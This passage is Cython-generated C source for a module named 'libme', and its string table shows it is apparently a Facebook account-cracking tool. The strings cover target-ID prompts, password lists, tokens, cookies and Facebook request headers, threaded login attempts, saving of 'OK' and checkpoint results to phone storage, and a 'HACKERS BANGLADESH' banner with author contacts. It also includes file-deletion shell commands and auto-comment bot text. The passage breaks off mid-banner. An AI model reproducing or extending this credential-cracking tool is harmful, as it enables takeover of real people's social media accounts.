#define __Pyx_PyBaseString_Join PyUnicode_Join
#endif
#if CYTHON_COMPILING_IN_CPYTHON
    #if PY_MAJOR_VERSION < 3
    #define __Pyx_PyBytes_Join _PyString_Join
    #else
    #define __Pyx_PyBytes_Join _PyBytes_Join
    #endif
#else
static CYTHON_INLINE PyObject* __Pyx_PyBytes_Join(PyObject* sep, PyObject* values);
#endif

/* UnpackUnboundCMethod.proto */
typedef struct {
    PyObject *type;
    PyObject **method_name;
    PyCFunction func;
    PyObject *method;
    int flag;
} __Pyx_CachedCFunction;

/* CallUnboundCMethod1.proto */
static PyObject* __Pyx__CallUnboundCMethod1(__Pyx_CachedCFunction* cfunc, PyObject* self, PyObject* arg);
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_CallUnboundCMethod1(__Pyx_CachedCFunction* cfunc, PyObject* self, PyObject* arg);
#else
#define __Pyx_CallUnboundCMethod1(cfunc, self, arg)  __Pyx__CallUnboundCMethod1(cfunc, self, arg)
#endif

/* ListCompAppend.proto */
#if CYTHON_USE_PYLIST_INTERNALS && CYTHON_ASSUME_SAFE_MACROS
static CYTHON_INLINE int __Pyx_ListComp_Append(PyObject* list, PyObject* x) {
    PyListObject* L = (PyListObject*) list;
    Py_ssize_t len = Py_SIZE(list);
    if (likely(L->allocated > len)) {
        Py_INCREF(x);
        PyList_SET_ITEM(list, len, x);
        __Pyx_SET_SIZE(list, len + 1);
        return 0;
    }
    return PyList_Append(list, x);
}
#else
#define __Pyx_ListComp_Append(L,x) PyList_Append(L,x)
#endif

/* Import.proto */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);

/* ImportFrom.proto */
static PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name);

/* PyIntBinop.proto */
#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_SubtractObjC(PyObject *op1, PyObject *op2, long intval, int inplace, int zerodivision_check);
#else
#define __Pyx_PyInt_SubtractObjC(op1, op2, intval, inplace, zerodivision_check)\
    (inplace ? PyNumber_InPlaceSubtract(op1, op2) : PyNumber_Subtract(op1, op2))
#endif

/* ObjectGetItem.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject *__Pyx_PyObject_GetItem(PyObject *obj, PyObject* key);
#else
#define __Pyx_PyObject_GetItem(obj, key)  PyObject_GetItem(obj, key)
#endif

/* FetchCommonType.proto */
static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type);

/* CythonFunctionShared.proto */
#define __Pyx_CyFunction_USED 1
#define __Pyx_CYFUNCTION_STATICMETHOD  0x01
#define __Pyx_CYFUNCTION_CLASSMETHOD   0x02
#define __Pyx_CYFUNCTION_CCLASS        0x04
#define __Pyx_CyFunction_GetClosure(f)\
    (((__pyx_CyFunctionObject *) (f))->func_closure)
#define __Pyx_CyFunction_GetClassObj(f)\
    (((__pyx_CyFunctionObject *) (f))->func_classobj)
#define __Pyx_CyFunction_Defaults(type, f)\
    ((type *)(((__pyx_CyFunctionObject *) (f))->defaults))
#define __Pyx_CyFunction_SetDefaultsGetter(f, g)\
    ((__pyx_CyFunctionObject *) (f))->defaults_getter = (g)
typedef struct {
    PyCFunctionObject func;
#if PY_VERSION_HEX < 0x030500A0
    PyObject *func_weakreflist;
#endif
    PyObject *func_dict;
    PyObject *func_name;
    PyObject *func_qualname;
    PyObject *func_doc;
    PyObject *func_globals;
    PyObject *func_code;
    PyObject *func_closure;
    PyObject *func_classobj;
    void *defaults;
    int defaults_pyobjects;
    size_t defaults_size;  // used by FusedFunction for copying defaults
    int flags;
    PyObject *defaults_tuple;
    PyObject *defaults_kwdict;
    PyObject *(*defaults_getter)(PyObject *);
    PyObject *func_annotations;
} __pyx_CyFunctionObject;
static PyTypeObject *__pyx_CyFunctionType = 0;
#define __Pyx_CyFunction_Check(obj)  (__Pyx_TypeCheck(obj, __pyx_CyFunctionType))
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject* op, PyMethodDef *ml,
                                      int flags, PyObject* qualname,
                                      PyObject *self,
                                      PyObject *module, PyObject *globals,
                                      PyObject* code);
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *m,
                                                         size_t size,
                                                         int pyobjects);
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *m,
                                                            PyObject *tuple);
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *m,
                                                             PyObject *dict);
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *m,
                                                              PyObject *dict);
static int __pyx_CyFunction_init(void);

/* CythonFunction.proto */
static PyObject *__Pyx_CyFunction_New(PyMethodDef *ml,
                                      int flags, PyObject* qualname,
                                      PyObject *closure,
                                      PyObject *module, PyObject *globals,
                                      PyObject* code);

/* SetNameInClass.proto */
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
#define __Pyx_SetNameInClass(ns, name, value)\
    (likely(PyDict_CheckExact(ns)) ? _PyDict_SetItem_KnownHash(ns, name, value, ((PyASCIIObject *) name)->hash) : PyObject_SetItem(ns, name, value))
#elif CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_SetNameInClass(ns, name, value)\
    (likely(PyDict_CheckExact(ns)) ? PyDict_SetItem(ns, name, value) : PyObject_SetItem(ns, name, value))
#else
#define __Pyx_SetNameInClass(ns, name, value)  PyObject_SetItem(ns, name, value)
#endif

/* CalculateMetaclass.proto */
static PyObject *__Pyx_CalculateMetaclass(PyTypeObject *metaclass, PyObject *bases);

/* Py3ClassCreate.proto */
static PyObject *__Pyx_Py3MetaclassPrepare(PyObject *metaclass, PyObject *bases, PyObject *name, PyObject *qualname,
                                           PyObject *mkw, PyObject *modname, PyObject *doc);
static PyObject *__Pyx_Py3ClassCreate(PyObject *metaclass, PyObject *name, PyObject *bases, PyObject *dict,
                                      PyObject *mkw, int calculate_metaclass, int allow_py2_metaclass);

/* CLineInTraceback.proto */
#ifdef CYTHON_CLINE_IN_TRACEBACK
#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)
#else
static int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);
#endif

/* CodeObjectCache.proto */
typedef struct {
    PyCodeObject* code_object;
    int code_line;
} __Pyx_CodeObjectCacheEntry;
struct __Pyx_CodeObjectCache {
    int count;
    int max_count;
    __Pyx_CodeObjectCacheEntry* entries;
};
static struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);
static PyCodeObject *__pyx_find_code_object(int code_line);
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);

/* AddTraceback.proto */
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename);

/* Print.proto */
static int __Pyx_Print(PyObject*, PyObject *, int);
#if CYTHON_COMPILING_IN_PYPY || PY_MAJOR_VERSION >= 3
static PyObject* __pyx_print = 0;
static PyObject* __pyx_print_kwargs = 0;
#endif

/* GCCDiagnostics.proto */
#if defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))
#define __Pyx_HAS_GCC_DIAGNOSTIC
#endif

/* PrintOne.proto */
static int __Pyx_PrintOne(PyObject* stream, PyObject *o);

/* CIntToPy.proto */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);

/* CIntFromPy.proto */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);

/* CIntFromPy.proto */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);

/* CheckBinaryVersion.proto */
static int __Pyx_check_binary_version(void);

/* InitStrings.proto */
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t);


/* Module declarations from 'libme' */
#define __Pyx_MODULE_NAME "libme"
extern int __pyx_module_is_main_libme;
int __pyx_module_is_main_libme = 0;

/* Implementation of 'libme' */
static PyObject *__pyx_builtin_ImportError;
static PyObject *__pyx_builtin_exit;
static PyObject *__pyx_builtin_ValueError;
static PyObject *__pyx_builtin_open;
static PyObject *__pyx_builtin_IOError;
static PyObject *__pyx_builtin_input;
static PyObject *__pyx_builtin_KeyError;
static PyObject *__pyx_builtin_range;
static const char __pyx_k_[] = "";
static const char __pyx_k_0[] = "0";
static const char __pyx_k_1[] = "1";
static const char __pyx_k_2[] = "2";
static const char __pyx_k_3[] = "3";
static const char __pyx_k_4[] = "4";
static const char __pyx_k_5[] = "5";
static const char __pyx_k_6[] = "6";
static const char __pyx_k_a[] = "a";
static const char __pyx_k_b[] = "b";
static const char __pyx_k_e[] = "e";
static const char __pyx_k_i[] = "i";
static const char __pyx_k_n[] = "n";
static const char __pyx_k_p[] = "p";
static const char __pyx_k_r[] = "r";
static const char __pyx_k_t[] = "t";
static const char __pyx_k_w[] = "w";
static const char __pyx_k_x[] = "x";
static const char __pyx_k_y[] = "y";
static const char __pyx_k_00[] = "00";
static const char __pyx_k_01[] = "01";
static const char __pyx_k_02[] = "02";
static const char __pyx_k_03[] = "03";
static const char __pyx_k_04[] = "04";
static const char __pyx_k_05[] = "05";
static const char __pyx_k_06[] = "06";
static const char __pyx_k_07[] = "07";
static const char __pyx_k_08[] = "08";
static const char __pyx_k_09[] = "09";
static const char __pyx_k_10[] = "10";
static const char __pyx_k_11[] = "11";
static const char __pyx_k_12[] = "12";
static const char __pyx_k_OK[] = "OK";
static const char __pyx_k_bl[] = "bl";
static const char __pyx_k_bu[] = "bu";
static const char __pyx_k_cp[] = "cp";
static const char __pyx_k_ct[] = "ct";
static const char __pyx_k_ex[] = "ex";
static const char __pyx_k_fb[] = "__fb__";
static const char __pyx_k_ft[] = "ft";
static const char __pyx_k_ha[] = "ha";
static const char __pyx_k_hr[] = "hr";
static const char __pyx_k_ib[] = "ib";
static const char __pyx_k_id[] = "id";
static const char __pyx_k_ip[] = "ip";
static const char __pyx_k_li[] = "li";
static const char __pyx_k_ok[] = "ok";
static const char __pyx_k_op[] = "op";
static const char __pyx_k_os[] = "os";
static const char __pyx_k_pw[] = "pw";
static const char __pyx_k_re[] = "re";
static const char __pyx_k_ta[] = "ta";
static const char __pyx_k_ua[] = "ua";
static const char __pyx_k_xo[] = "xo";
static const char __pyx_k_xx[] = "xx";
static const char __pyx_k_zx[] = "zx";
static const char __pyx_k_123[] = "123";
static const char __pyx_k_156[] = "156";
static const char __pyx_k_786[] = "786";
static const char __pyx_k_Frr[] = "__Frr__";
static const char __pyx_k_May[] = "May";
static const char __pyx_k__12[] = ",";
static const char __pyx_k__28[] = "\360\237\222\234";
static const char __pyx_k__38[] = "|";
static const char __pyx_k__39[] = "\n";
static const char __pyx_k__43[] = " ";
static const char __pyx_k__55[] = "://(.*?)$";
static const char __pyx_k__56[] = ";";
static const char __pyx_k__68[] = "==";
static const char __pyx_k__97[] = "____";
static const char __pyx_k_api[] = "__api__";
static const char __pyx_k_ask[] = "ask";
static const char __pyx_k_bs4[] = "bs4";
static const char __pyx_k_day[] = "day";
static const char __pyx_k_doc[] = "__doc__";
static const char __pyx_k_end[] = "end";
static const char __pyx_k_fb2[] = "__fb2__";
static const char __pyx_k_fb3[] = "__fb3__";
static const char __pyx_k_fb4[] = "__fb4__";
static const char __pyx_k_get[] = "get";
static const char __pyx_k_hex[] = "hex";
static const char __pyx_k_id1[] = "id1";
static const char __pyx_k_id2[] = "id2";
static const char __pyx_k_ids[] = "__ids";
static const char __pyx_k_idx[] = "idx";
static const char __pyx_k_key[] = "key";
static const char __pyx_k_lsd[] = "lsd";
static const char __pyx_k_now[] = "now";
static const char __pyx_k_pwx[] = "pwx";
static const char __pyx_k_rex[] = "rex";
static const char __pyx_k_s_s[] = "%s|%s";
static const char __pyx_k_ses[] = "ses";
static const char __pyx_k_sys[] = "sys";
static const char __pyx_k_uid[] = "uid";
static const char __pyx_k_url[] = "url";
static const char __pyx_k_1000[] = "__1000__";
static const char __pyx_k_1234[] = "1234";
static const char __pyx_k_EAAA[] = "EAAA";
static const char __pyx_k_Frrr[] = "__Frrr__";
static const char __pyx_k_Host[] = "Host";
static const char __pyx_k_July[] = "July";
static const char __pyx_k_June[] = "June";
static const char __pyx_k_Star[] = "Star\342\235\244\357\270\217";
static const char __pyx_k__112[] = "_____";
static const char __pyx_k_apii[] = "__apii__";
static const char __pyx_k_bapi[] = "__bapi__";
static const char __pyx_k_coeg[] = "coeg";
static const char __pyx_k_cuid[] = "cuid";
static const char __pyx_k_data[] = "data";
static const char __pyx_k_date[] = "date";
static const char __pyx_k_exit[] = "exit";
static const char __pyx_k_file[] = "__file__";
static const char __pyx_k_gaaa[] = "gaaa";
static const char __pyx_k_home[] = "home";
static const char __pyx_k_host[] = "host";
static const char __pyx_k_hulu[] = "hulu";
static const char __pyx_k_id_2[] = "__id";
static const char __pyx_k_init[] = "__init__";
static const char __pyx_k_join[] = "join";
static const char __pyx_k_json[] = "json";
static const char __pyx_k_keys[] = "keys";
static const char __pyx_k_kuki[] = "kuki";
static const char __pyx_k_line[] = "line";
static const char __pyx_k_loop[] = "loop";
static const char __pyx_k_love[] = "love";
static const char __pyx_k_lulu[] = "lulu";
static const char __pyx_k_m_ts[] = "m_ts";
static const char __pyx_k_main[] = "__main__";
static const char __pyx_k_menn[] = "__menn__";
static const char __pyx_k_nama[] = "nama";
static const char __pyx_k_name[] = "name";
static const char __pyx_k_open[] = "open";
static const char __pyx_k_pass[] = "pass";
static const char __pyx_k_post[] = "post";
static const char __pyx_k_read[] = "read";
static const char __pyx_k_save[] = "save";
static const char __pyx_k_self[] = "self";
static const char __pyx_k_test[] = "__test__";
static const char __pyx_k_text[] = "text";
static const char __pyx_k_time[] = "time";
static const char __pyx_k_true[] = "true";
static const char __pyx_k_user[] = "user";
static const char __pyx_k_uuid[] = "uuid";
static const char __pyx_k_year[] = "year";
static const char __pyx_k_10000[] = "10000";
static const char __pyx_k_10007[] = "__10007__";
static const char __pyx_k_12345[] = "12345";
static const char __pyx_k_33__3[] = "__33__3__";
static const char __pyx_k_April[] = "April";
static const char __pyx_k_James[] = "James";
static const char __pyx_k_Liger[] = "Liger";
static const char __pyx_k_March[] = "March";
static const char __pyx_k_Trial[] = "Trial";
static const char __pyx_k_actor[] = "actor";
static const char __pyx_k_bulan[] = "bulan";
static const char __pyx_k_clear[] = "clear";
static const char __pyx_k_close[] = "close";
static const char __pyx_k_email[] = "email";
static const char __pyx_k_enter[] = "__enter__";
static const char __pyx_k_false[] = "false";
static const char __pyx_k_flush[] = "flush";
static const char __pyx_k_input[] = "input";
static const char __pyx_k_items[] = "items";
static const char __pyx_k_james[] = "james";
static const char __pyx_k_libme[] = "libme";
static const char __pyx_k_limit[] = "limit";
static const char __pyx_k_loads[] = "loads";
static const char __pyx_k_login[] = "__login__";
static const char __pyx_k_lower[] = "lower";
static const char __pyx_k_masal[] = "__masal__";
static const char __pyx_k_mennn[] = "__mennn__";
static const char __pyx_k_mkdir[] = "mkdir";
static const char __pyx_k_month[] = "month";
static const char __pyx_k_nTemp[] = "nTemp";
static const char __pyx_k_print[] = "print";
static const char __pyx_k_range[] = "range";
static const char __pyx_k_s_s_2[] = "  ~> %s|%s\n";
static const char __pyx_k_s_s_3[] = "%s=%s";
static const char __pyx_k_s_s_s[] = "%s %s %s";
static const char __pyx_k_split[] = "split";
static const char __pyx_k_start[] = "__start__";
static const char __pyx_k_strip[] = "strip";
static const char __pyx_k_today[] = "today";
static const char __pyx_k_token[] = "token";
static const char __pyx_k_total[] = "__total";
static const char __pyx_k_upper[] = "upper";
static const char __pyx_k_uuid4[] = "uuid4";
static const char __pyx_k_value[] = "value";
static const char __pyx_k_write[] = "write";
static const char __pyx_k_100000[] = "100000";
static const char __pyx_k_100074[] = "100074";
static const char __pyx_k_100075[] = "100075";
static const char __pyx_k_100076[] = "100076";
static const char __pyx_k_100078[] = "100078";
static const char __pyx_k_33__33[] = "__33__33__";
static const char __pyx_k_August[] = "August";
static const char __pyx_k_Fr__rr[] = "__Fr__rr__";
static const char __pyx_k_accept[] = "accept";
static const char __pyx_k_apikey[] = "apikey";
static const char __pyx_k_append[] = "append";
static const char __pyx_k_base64[] = "base64";
static const char __pyx_k_c_user[] = "c_user";
static const char __pyx_k_choice[] = "choice";
static const char __pyx_k_choose[] = "choose";
static const char __pyx_k_exit_2[] = "__exit__";
static const char __pyx_k_file_2[] = "__file";
static const char __pyx_k_file_3[] = "file";
static const char __pyx_k_file_4[] = "___file";
static const char __pyx_k_import[] = "__import__";
static const char __pyx_k_kwargs[] = "kwargs";
static const char __pyx_k_masal2[] = "__masal2__";
static const char __pyx_k_member[] = "member";
static const char __pyx_k_module[] = "__module__";
static const char __pyx_k_myfile[] = "myfile";
static const char __pyx_k_name_2[] = "__name__";
static const char __pyx_k_origin[] = "origin";
static const char __pyx_k_parser[] = "parser";
static const char __pyx_k_random[] = "random";
static const char __pyx_k_sdcard[] = "/sdcard/";
static const char __pyx_k_status[] = "status";
static const char __pyx_k_stdout[] = "stdout";
static const char __pyx_k_submit[] = "submit";
static const char __pyx_k_system[] = "system";
static const char __pyx_k_update[] = "update";
static const char __pyx_k_urllib[] = "urllib";
static const char __pyx_k_1000000[] = "1000000";
static const char __pyx_k_10000_2[] = "__10000__";
static const char __pyx_k_100__00[] = "__100__00__";
static const char __pyx_k_100__07[] = "__100__07__";
static const char __pyx_k_IOError[] = "IOError";
static const char __pyx_k_January[] = "January";
static const char __pyx_k_Love_it[] = "Love it\360\237\245\260";
static const char __pyx_k_October[] = "October";
static const char __pyx_k_Premium[] = "Premium";
static const char __pyx_k_Session[] = "Session";
static const char __pyx_k_Wow_sir[] = "Wow sir\360\237\226\244";
static const char __pyx_k_comment[] = "comment";
static const char __pyx_k_confirm[] = "confirm";
static const char __pyx_k_cookies[] = "cookies";
static const char __pyx_k_current[] = "current";
static const char __pyx_k_expired[] = "expired";
static const char __pyx_k_f_james[] = "__f_james__";
static const char __pyx_k_findall[] = "findall";
static const char __pyx_k_friends[] = "friends";
static const char __pyx_k_getpass[] = "getpass";
static const char __pyx_k_hashlib[] = "hashlib";
static const char __pyx_k_headers[] = "headers";
static const char __pyx_k_jazoest[] = "jazoest";
static const char __pyx_k_login_2[] = "login";
static const char __pyx_k_me__nnn[] = "__me__nnn__";
static const char __pyx_k_my_date[] = "my_date";
static const char __pyx_k_prepare[] = "__prepare__";
static const char __pyx_k_randint[] = "randint";
static const char __pyx_k_referer[] = "referer";
static const char __pyx_k_replace[] = "replace";
static const char __pyx_k_request[] = "__request__";
static const char __pyx_k_s_s_s_s[] = "%s-%s-%s-%s";
static const char __pyx_k_weekday[] = "weekday";
static const char __pyx_k_CP_s_txt[] = "CP/%s.txt";
static const char __pyx_k_December[] = "December";
static const char __pyx_k_February[] = "February";
static const char __pyx_k_KeyError[] = "KeyError";
static const char __pyx_k_November[] = "November";
static const char __pyx_k_OK_s_txt[] = "OK/%s.txt";
static const char __pyx_k_calendar[] = "calendar";
static const char __pyx_k_datetime[] = "datetime";
static const char __pyx_k_day_name[] = "day_name";
static const char __pyx_k_dev_null[] = " >/dev/null";
static const char __pyx_k_get_dict[] = "get_dict";
static const char __pyx_k_git_pull[] = "git pull";
static const char __pyx_k_listpass[] = "listpass";
static const char __pyx_k_ma__sal2[] = "__ma__sal2__";
static const char __pyx_k_password[] = "&password=";
static const char __pyx_k_qualname[] = "__qualname__";
static const char __pyx_k_requests[] = "requests";
static const char __pyx_k_response[] = "response";
static const char __pyx_k_EXCELLENT[] = "EXCELLENT";
static const char __pyx_k_Expired_s[] = "  [\342\234\223] Expired : %s ";
static const char __pyx_k_James_Bro[] = "James Bro\360\237\222\231";
static const char __pyx_k_September[] = "September";
static const char __pyx_k_Your_ip_s[] = "  [\342\234\223] Your ip : %s ";
static const char __pyx_k_bulan_ttl[] = "bulan_ttl";
static const char __pyx_k_error_msg[] = "error_msg";
static const char __pyx_k_libme_pyx[] = "libme.pyx";
static const char __pyx_k_login_txt[] = "login.txt";
static const char __pyx_k_ma___sal2[] = "__ma___sal2__";
static const char __pyx_k_main_coeg[] = "main_coeg";
static const char __pyx_k_max_age_0[] = "max-age=0";
static const char __pyx_k_menu_file[] = "menu_file";
static const char __pyx_k_metaclass[] = "__metaclass__";
static const char __pyx_k_method__1[] = "__method__1__";
static const char __pyx_k_method__2[] = "__method__2__";
static const char __pyx_k_pastefile[] = "pastefile";
static const char __pyx_k_readlines[] = "readlines";
static const char __pyx_k_threading[] = "threading";
static const char __pyx_k_James_Boss[] = "James Boss\360\237\222\232";
static const char __pyx_k_James___fb[] = "James.__fb__";
static const char __pyx_k_Select_One[] = "\n  [\342\200\242] Select One : ";
static const char __pyx_k_Super_Star[] = "Super Star\360\237\247\241";
static const char __pyx_k_ValueError[] = "ValueError";
static const char __pyx_k_checkpoint[] = "checkpoint";
static const char __pyx_k_concurrent[] = "concurrent";
static const char __pyx_k_exceptions[] = "exceptions";
static const char __pyx_k_menu__file[] = "__menu__file__";
static const char __pyx_k_noscript_1[] = "noscript=1;";
static const char __pyx_k_subprocess[] = "subprocess";
static const char __pyx_k_try_number[] = "try_number";
static const char __pyx_k_user_agent[] = "user-agent";
static const char __pyx_k_Big_fan_sir[] = "Big fan sir\342\235\244\357\270\217";
static const char __pyx_k_ImportError[] = "ImportError";
static const char __pyx_k_James___Frr[] = "James.__Frr__";
static const char __pyx_k_James___api[] = "James.__api__";
static const char __pyx_k_James___fb2[] = "James.__fb2__";
static const char __pyx_k_James___fb3[] = "James.__fb3__";
static const char __pyx_k_James___fb4[] = "James.__fb4__";
static const char __pyx_k_Return_menu[] = "  [\342\200\242] Return menu";
static const char __pyx_k_bot__follow[] = "__bot__follow__";
static const char __pyx_k_fb_noscript[] = "_fb_noscript";
static const char __pyx_k_html_parser[] = "html.parser";
static const char __pyx_k_max_workers[] = "max_workers";
static const char __pyx_k_session_key[] = "session_key";
static const char __pyx_k_sir_big_fan[] = "sir big fan\360\237\222\232";
static const char __pyx_k_James___1000[] = "James.__1000__";
static const char __pyx_k_James___Frrr[] = "James.__Frrr__";
static const char __pyx_k_James___apii[] = "James.__apii__";
static const char __pyx_k_James___bapi[] = "James.__bapi__";
static const char __pyx_k_James___file[] = "James.__file__";
static const char __pyx_k_James___init[] = "James.__init__";
static const char __pyx_k_James___menn[] = "James.__menn__";
static const char __pyx_k_Love_you_sir[] = "Love you sir\360\237\226\244";
static const char __pyx_k_access_token[] = "&access_token=";
static const char __pyx_k_apikey___log[] = ".__apikey__.log";
static const char __pyx_k_content_type[] = "content-type";
static const char __pyx_k_gzip_deflate[] = "gzip, deflate";
static const char __pyx_k_prefill_type[] = "prefill_type";
static const char __pyx_k_x_fb_net_hni[] = "x-fb-net-hni";
static const char __pyx_k_x_fb_sim_hni[] = "x-fb-sim-hni";
static const char __pyx_k_BeautifulSoup[] = "BeautifulSoup";
static const char __pyx_k_Choose_Option[] = "\n  [\342\200\242] Choose Option :  ";
static const char __pyx_k_Enter_User_ID[] = "  [+] Enter User ID : ";
static const char __pyx_k_James___10000[] = "James.__10000__";
static const char __pyx_k_James___10007[] = "James.__10007__";
static const char __pyx_k_James___33__3[] = "James.__33__3__";
static const char __pyx_k_James___login[] = "James.__login__";
static const char __pyx_k_James___masal[] = "James.__masal__";
static const char __pyx_k_James___mennn[] = "James.__mennn__";
static const char __pyx_k_James___start[] = "James.__start__";
static const char __pyx_k_Token_Invalid[] = "  [!]  Token Invalid";
static const char __pyx_k_Token_invalid[] = "  [!] Token invalid";
static const char __pyx_k_Wrong_Key_Bro[] = "  Wrong Key Bro... \n";
static const char __pyx_k_cache_control[] = "cache-control";
static const char __pyx_k_is_smart_lock[] = "is_smart_lock";
static const char __pyx_k_s_s_ok_s_cp_s[] = "\r  [\342\200\242] %s/%s ~> ok~> %s - cp~> %s ";
static const char __pyx_k_sdcard_f2_txt[] = "/sdcard/f2.txt";
static const char __pyx_k_1_92m_T_Date_s[] = "\033[1;92m  [\342\234\223] T-Date  : %s ";
static const char __pyx_k_Enter_Password[] = "  [+] Enter Password : ";
static const char __pyx_k_Enter_password[] = "  [+] Enter password : ";
static const char __pyx_k_Expired_tokens[] = " [!] Expired tokens";
static const char __pyx_k_James___Fr__rr[] = "James.__Fr__rr__";
static const char __pyx_k_James___masal2[] = "James.__masal2__";
static const char __pyx_k_expired_tokens[] = " [!] expired tokens";
static const char __pyx_k_prefill_source[] = "prefill_source";
static const char __pyx_k_rm_f_login_txt[] = "rm -f login.txt";
static const char __pyx_k_sdcard_100_txt[] = "/sdcard/100.txt";
static const char __pyx_k_sdcard_f_2_txt[] = "/sdcard/f_2.txt";
static const char __pyx_k_0_91m_s_s_0_97m[] = "\r  \033[0;91m ~> %s|%s\033[0;97m         ";
static const char __pyx_k_0_92m_Enter_Key[] = "\033[0;92m[+] Enter Key : ";
static const char __pyx_k_0_92m_s_s_0_97m[] = "\r  \033[0;92m ~> %s|%s\033[0;97m         ";
static const char __pyx_k_0_97m_s_s_0_97m[] = "\r  \033[0;97m ~> %s|%s\033[0;97m         ";
static const char __pyx_k_1_91m_s_s_0_97m[] = "\r  \033[1;91m ~> %s|%s\033[0;97m        ";
static const char __pyx_k_1_92m_s_s_0_97m[] = "\r  \033[1;92m ~> %s|%s\033[0;97m";
static const char __pyx_k_Big_fan_brother[] = "Big fan brother\360\237\222\233";
static const char __pyx_k_Choose_Option_2[] = "\n  [\342\200\242] Choose Option : ";
static const char __pyx_k_ConnectionError[] = "ConnectionError";
static const char __pyx_k_Enter_your_file[] = "  [+] Enter your file : ";
static const char __pyx_k_James___100__00[] = "James.__100__00__";
static const char __pyx_k_James___100__07[] = "James.__100__07__";
static const char __pyx_k_James___f_james[] = "James.__f_james__";
static const char __pyx_k_James___me__nnn[] = "James.__me__nnn__";
static const char __pyx_k_James___request[] = "James.__request__";
static const char __pyx_k_James_main_coeg[] = "James.main_coeg";
static const char __pyx_k_accept_encoding[] = "accept-encoding";
static const char __pyx_k_accept_language[] = "accept-language";
static const char __pyx_k_pip_install_bs4[] = "pip  install bs4";
static const char __pyx_k_sdcard_1000_txt[] = "/sdcard/1000.txt";
static const char __pyx_k_sdcard_10_0_txt[] = "/sdcard/10_0.txt";
static const char __pyx_k_touch_login_txt[] = "touch login.txt";
static const char __pyx_k_0_97m_Your_Token[] = "\n   \033[0;97m[+] Your Token : ";
static const char __pyx_k_James___ma__sal2[] = "James.__ma__sal2__";
static const char __pyx_k_had_cp_prefilled[] = "had_cp_prefilled";
static const char __pyx_k_www_facebook_com[] = "www.facebook.com";
static const char __pyx_k_x_fb_http_engine[] = "x-fb-http-engine";
static const char __pyx_k_Cracking_finished[] = "\n\n [\342\234\223] Cracking finished...";
static const char __pyx_k_James___ma___sal2[] = "James.__ma___sal2__";
static const char __pyx_k_James___method__1[] = "James.__method__1__";
static const char __pyx_k_James___method__2[] = "James.__method__2__";
static const char __pyx_k_cracking_finished[] = "\n\n (\342\234\223) cracking finished...";
static const char __pyx_k_James___menu__file[] = "James.__menu__file__";
static const char __pyx_k_ThreadPoolExecutor[] = "ThreadPoolExecutor";
static const char __pyx_k_Warning_Check_link[] = "  [\303\227] Warning! Check link";
static const char __pyx_k_cline_in_traceback[] = "cline_in_traceback";
static const char __pyx_k_concurrent_futures[] = "concurrent.futures";
static const char __pyx_k_first_prefill_type[] = "first_prefill_type";
static const char __pyx_k_unrecognized_tries[] = "unrecognized_tries";
static const char __pyx_k_James___bot__follow[] = "James.__bot__follow__";
static const char __pyx_k_Password_Method_y_t[] = "  [!] Password Method [y/t] : ";
static const char __pyx_k_Password_method_y_t[] = "  [?] Password method [y/t] : ";
static const char __pyx_k_Sir_please_reply_me[] = "Sir please reply me\360\237\222\231";
static const char __pyx_k_pip_install_futures[] = "pip install futures";
static const char __pyx_k_rm_rf_sdcard_f2_txt[] = "rm -rf /sdcard/f2.txt";
static const char __pyx_k_first_prefill_source[] = "first_prefill_source";
static const char __pyx_k_pip_install_requests[] = "pip install requests";
static const char __pyx_k_rm_rf_sdcard_100_txt[] = "rm -rf /sdcard/100.txt";
static const char __pyx_k_rm_rf_sdcard_f_2_txt[] = "rm -rf /sdcard/f_2.txt";
static const char __pyx_k_x_fb_connection_type[] = "x-fb-connection-type";
static const char __pyx_k_0_97m_Enter_your_file[] = "  \033[0;97m[+] Enter your file : ";
static const char __pyx_k_1_92m_____1_92m_1_92m[] = "\n\033[1;92m    _          _          \n\033[1;92m     \\        /          \n\033[1;92m    __\\______/__ \n\033[1;92m    | [\033[1;31;1m\302\251\033[1;92m]  [\033[1;31;1m\302\251\033[1;92m] |\342\200\213 \n\033[1;92m    |  [\033[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92m\342\225\224\342\225\220\342\225\220o00\342\225\220\342\225\220\342\225\220\342\225\220\342\225\220\342\225\220\342\225\220\342\225\22000o\342\225\220\342\225\220\342\225\220\342\225\220\342\225\220\342\225\220\342\225\220\342\225\220\342\225\220\342\225\220\342\225\220\342\225\220\342\225\220\342\225\220\342\225\220\342\225\220\342\225\220\342\225\220\342\225\220\342\225\220\342\225\220\342\225\220\342\225\220\342\225\220\342\225\220\342\225\227 \n\033[1;31;1m\342\226\210 \033[1;92m [\342\200\242] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m \342\226\210 \n\033[0;97m\033[1;31;1m\342\226\210 \033[1;92m [\342\200\242] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m \342\226\210  \n\033[0;97m\033[1;31;1m\342\226\210 \033[1;92m [\342\200\242] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m 